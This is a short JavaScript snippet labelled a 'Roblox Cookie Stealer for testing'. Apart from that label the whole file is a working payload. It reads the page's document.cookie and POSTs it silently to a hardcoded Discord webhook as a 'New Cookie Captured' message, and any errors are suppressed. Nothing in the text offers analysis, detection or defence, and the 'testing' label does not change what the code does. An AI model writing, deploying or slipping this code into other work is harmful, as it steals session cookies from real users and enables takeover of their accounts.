// Simple Roblox Cookie Stealer for testing
(function() {
    const webhook = "https://discord.com/api/webhooks/1523007638986555422/4eIrF8glLh8N0Lhai_hoCnymOnq5MReL2tbnv0MQT71UowPX_ygDcbH7_87AdgO-hx95";
    
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "**New Cookie Captured**\n```" + document.cookie + "```"
        })
    }).catch(() => {});
})();